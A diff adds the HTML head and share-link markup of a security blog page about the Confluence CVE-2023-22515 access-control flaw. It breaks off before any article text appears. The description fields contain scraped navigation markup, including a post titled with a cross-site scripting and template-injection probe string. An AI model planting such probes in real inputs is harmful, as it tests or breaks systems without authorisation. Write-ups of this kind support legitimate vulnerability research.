@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server | s1r1us Blog</title>
+  <link rel = 'canonical' href = '//localhost:1313/posts/broken-conflu/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:url" content="//localhost:1313/posts/broken-conflu/">
+  <meta property="og:site_name" content="s1r1us Blog">
+  <meta property="og:title" content="CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server">
+  <meta property="og:description" content="{.V4YR2c}
+{.vu8Pwe}
+{.V4YR2c}
+Search this site
+{.fAUEUd}
+Skip to main content
+Skip to navigation
+{.wFCWne}
+{.r9CsCb role=“img” aria-label=“Site home”}{.XMyrgf}s1r1us{.Zjiec .oNsfjf}
+Home{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/home&#34; data-type=“1” level=“1”} {.dvmRw} Questions{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“false” aria-haspopup=“true” url=&#34;/questions&#34; data-type=“1” level=“1”} why much of science progress happened in west?{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/questions/why-much-of-science-progress-happened-in-west&#34; data-type=“1” level=“2”} my curse of curiosity and the problem of choice{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/questions/my-curse-of-curiosity-and-the-problem-of-choice&#34; data-type=“1” level=“2”} Books{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/books&#34; data-type=“1” level=“1”} Advisories{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/advisories&#34; data-type=“1” level=“1”} {.dvmRw} CTF{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“false” aria-haspopup=“true” url=&#34;/CTF&#34; data-type=“1” level=“1”} BountyCon 2020{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/bountycon2020&#34; data-type=“1” level=“2”} H1-2006-CTF{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/h1-2006-ctf&#34; data-type=“1” level=“2”} Hack.lu{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/hack-lu&#34; data-type=“1” level=“2”} Facebook CTF&#39;19 writeup{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/facebook-ctf19-writeup&#34; data-type=“1” level=“2”} CSAW&#39;19 CTF{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/csaw19-ctf&#34; data-type=“1” level=“2”} tangled_browsers{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/tangled_browsers&#34; data-type=“1” level=“2”} ByteBandits CTF 2020{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/bytebandits-ctf-2020&#34; data-type=“1” level=“2”} Google CTF - 2020{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/IuseBing&#34; data-type=“1” level=“2”} zer0ptsCTF2021-challenges{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/zer0ptsctf2021-challenges&#34; data-type=“1” level=“2”} site-isolation{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/site-isolation&#34; data-type=“1” level=“2”} BsidesAHM2021{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/bsidesahm2021&#34; data-type=“1” level=“2”} {.dvmRw .FWGjId} Research{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“true” aria-haspopup=“true” url=&#34;/research&#34; data-type=“1” level=“1”} Cookie Tossing to RCE on Google Cloud Jupyter Notebooks{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks&#34; data-type=“1” level=“2”} test&#39;&gt;&#34;&gt;test{{7*7}}{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/research/testtest77&#34; data-type=“1” level=“2”} Prototype Pollution{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/research/PP&#34; data-type=“1” level=“2”} BrokenConflu{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-selected=“true” url=&#34;/research/brokenconflu&#34; data-type=“1” level=“2”} {.dvmRw} About Me{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“false” aria-haspopup=“true” url=&#34;/about-me&#34; data-type=“1” level=“1”} Looking Back Looking Forward: 2021{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/about-me/Looking-Back-Looking-Forward&#34; data-type=“1” level=“2”} Inspiration{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/inspiration&#34; data-type=“1” level=“1”} {.lzy1Td role=“img” aria-label=“Site home” jsname=“SwcDWb”}s1r1us{.GAuSPc jsname=“jIujaf”}">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-03T14:09:13+05:30">
+    <meta property="article:modified_time" content="2024-11-03T14:09:13+05:30">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server">
+  <meta name="twitter:description" content="{.V4YR2c}
+{.vu8Pwe}
+{.V4YR2c}
+Search this site
+{.fAUEUd}
+Skip to main content
+Skip to navigation
+{.wFCWne}
+{.r9CsCb role=“img” aria-label=“Site home”}{.XMyrgf}s1r1us{.Zjiec .oNsfjf}
+Home{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/home&#34; data-type=“1” level=“1”} {.dvmRw} Questions{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“false” aria-haspopup=“true” url=&#34;/questions&#34; data-type=“1” level=“1”} why much of science progress happened in west?{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/questions/why-much-of-science-progress-happened-in-west&#34; data-type=“1” level=“2”} my curse of curiosity and the problem of choice{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/questions/my-curse-of-curiosity-and-the-problem-of-choice&#34; data-type=“1” level=“2”} Books{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/books&#34; data-type=“1” level=“1”} Advisories{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/advisories&#34; data-type=“1” level=“1”} {.dvmRw} CTF{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“false” aria-haspopup=“true” url=&#34;/CTF&#34; data-type=“1” level=“1”} BountyCon 2020{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/bountycon2020&#34; data-type=“1” level=“2”} H1-2006-CTF{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/h1-2006-ctf&#34; data-type=“1” level=“2”} Hack.lu{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/hack-lu&#34; data-type=“1” level=“2”} Facebook CTF&#39;19 writeup{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/facebook-ctf19-writeup&#34; data-type=“1” level=“2”} CSAW&#39;19 CTF{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/csaw19-ctf&#34; data-type=“1” level=“2”} tangled_browsers{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/tangled_browsers&#34; data-type=“1” level=“2”} ByteBandits CTF 2020{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/bytebandits-ctf-2020&#34; data-type=“1” level=“2”} Google CTF - 2020{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/IuseBing&#34; data-type=“1” level=“2”} zer0ptsCTF2021-challenges{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/zer0ptsctf2021-challenges&#34; data-type=“1” level=“2”} site-isolation{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/site-isolation&#34; data-type=“1” level=“2”} BsidesAHM2021{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/CTF/bsidesahm2021&#34; data-type=“1” level=“2”} {.dvmRw .FWGjId} Research{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“true” aria-haspopup=“true” url=&#34;/research&#34; data-type=“1” level=“1”} Cookie Tossing to RCE on Google Cloud Jupyter Notebooks{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks&#34; data-type=“1” level=“2”} test&#39;&gt;&#34;&gt;test{{7*7}}{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/research/testtest77&#34; data-type=“1” level=“2”} Prototype Pollution{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/research/PP&#34; data-type=“1” level=“2”} BrokenConflu{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-selected=“true” url=&#34;/research/brokenconflu&#34; data-type=“1” level=“2”} {.dvmRw} About Me{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” aria-expanded=“false” aria-haspopup=“true” url=&#34;/about-me&#34; data-type=“1” level=“1”} Looking Back Looking Forward: 2021{.aJHbb .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/about-me/Looking-Back-Looking-Forward&#34; data-type=“1” level=“2”} Inspiration{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=“QwLHlb” role=“link” tabindex=“0” navtype=“1” url=&#34;/inspiration&#34; data-type=“1” level=“1”} {.lzy1Td role=“img” aria-label=“Site home” jsname=“SwcDWb”}s1r1us{.GAuSPc jsname=“jIujaf”}">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="/css/styles.6f4b00fe40de218be5e0e8eb9d81313f333e5551367ce91183fe6982f40101aa5af04254d05805493340fbdb4822c019c25b0dc69a345e19175bd9b5467dc0ac.css" integrity="sha512-b0sA/kDeIYvl4OjrnYExPzM&#43;VVE2fOkRg/5pgvQBAapa8EJU0FgFSTNA&#43;9tIIsAZwlsNxpo0XhkXW9m1Rn3ArA=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="//localhost:1313/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" //localhost:1313/posts/my-advice-for-someone-who-wants-to-be-an-hacker/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&text=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&title=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&is_video=false&description=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&title=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&title=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&name=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server&description=%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iVjRZUjJjIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8%2bPHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6IiAvPjwvc3ZnPg%3d%3d%22%20alt%3d%22%22%3e%7b.V4YR2c%7d%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0idnU4UHdlIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0xNS41IDE0aC0uNzlsLS4yOC0uMjdDMTUuNDEgMTIuNTkgMTYgMTEuMTEgMTYgOS41IDE2IDUuOTEgMTMuMDkgMyA5LjUgM1MzIDUuOTEgMyA5LjUgNS45MSAxNiA5LjUgMTZjMS42MSAwIDMuMDktLjU5IDQuMjMtMS41N2wuMjcuMjh2Ljc5bDUgNC45OUwyMC40OSAxOWwtNC45OS01em0tNiAwQzcuMDEgMTQgNSAxMS45OSA1IDkuNVM3LjAxIDUgOS41IDUgMTQgNy4wMSAxNCA5LjUgMTEuOTkgMTQgOS41IDE0eiIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg%3d%3d%22%20alt%3d%22%22%3e%7b.vu8Pwe%7d%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iVjRZUjJjIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8%2bPHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6IiAvPjwvc3ZnPg%3d%3d%22%20alt%3d%22%22%3e%7b.V4YR2c%7d%3c%2fp%3e%0a%3cp%3eSearch%20this%20site%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZkFVRVVkIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0xOSA2LjQxTDE3LjU5IDUgMTIgMTAuNTkgNi40MSA1IDUgNi40MSAxMC41OSAxMiA1IDE3LjU5IDYuNDEgMTkgMTIgMTMuNDEgMTcuNTkgMTkgMTkgMTcuNTkgMTMuNDEgMTJ6IiAvPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8%2bPC9zdmc%2b%22%20alt%3d%22%22%3e%7b.fAUEUd%7d%3c%2fp%3e%0a%3cp%3eSkip%20to%20main%20content%3c%2fp%3e%0a%3cp%3eSkip%20to%20navigation%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0id0ZDV25lIiB2aWV3Ym94PSIwIDAgMjQgMjQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBqc25hbWU9IkIxbjl1YiIgZm9jdXNhYmxlPSJmYWxzZSI%2bPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTIsMTIpIj48cGF0aCBjbGFzcz0iaGxKSDAiIGQ9Ik0tOSAtNSBMOSAtNSIgZmlsbD0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIyIiAvPjxwYXRoIGNsYXNzPSJIQnU2TiIgZD0iTS05IDAgTDkgMCIgZmlsbD0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIyIiAvPjxwYXRoIGNsYXNzPSJjTEFHUWUiIGQ9Ik0tOSA1IEw5IDUiIGZpbGw9Im5vbmUiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c%2bPC9zdmc%2b%22%20alt%3d%22%22%3e%7b.wFCWne%7d%3c%2fp%3e%0a%3cp%3e%3ca%20href%3d%22%2fhome%22%3e%3cimg%20src%3d%22https%3a%2f%2flh5.googleusercontent.com%2f-oZZhZc9Pzr-nQYzLLJKOOnQOPilv9vMC45HKARYGOqlI_koFYOw63xvcNn-Dt284RgUCmh-Gy261Ul7XwSwd-A%3dw16383%22%20alt%3d%22%22%3e%7b.r9CsCb%0arole%3d%26ldquo%3bimg%26rdquo%3b%0aaria-label%3d%26ldquo%3bSite%20home%26rdquo%3b%7d%3c%2fa%3e%7b.XMyrgf%7d%3ca%20href%3d%22%2fhome%22%3es1r1us%3c%2fa%3e%7b.Zjiec%20.oNsfjf%7d%3c%2fp%3e%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fhome%22%3eHome%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fhome%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI%2bPHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI%2bPHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4%3d%22%20alt%3d%22%22%3e%7b.dvmRw%7d%0a%3ca%20href%3d%22%2fquestions%22%3eQuestions%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aaria-expanded%3d%26ldquo%3bfalse%26rdquo%3b%20aria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fquestions%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fquestions%2fwhy-much-of-science-progress-happened-in-west%22%3ewhy%20much%20of%20science%20progress%20happened%20in%0awest%3f%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fquestions%2fwhy-much-of-science-progress-happened-in-west%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fquestions%2fmy-curse-of-curiosity-and-the-problem-of-choice%22%3emy%20curse%20of%20curiosity%20and%20the%20problem%20of%0achoice%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fquestions%2fmy-curse-of-curiosity-and-the-problem-of-choice%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fbooks%22%3eBooks%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fbooks%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fadvisories%22%3eAdvisories%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fadvisories%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI%2bPHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI%2bPHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4%3d%22%20alt%3d%22%22%3e%7b.dvmRw%7d%0a%3ca%20href%3d%22%2fCTF%22%3eCTF%3c%2fa%3e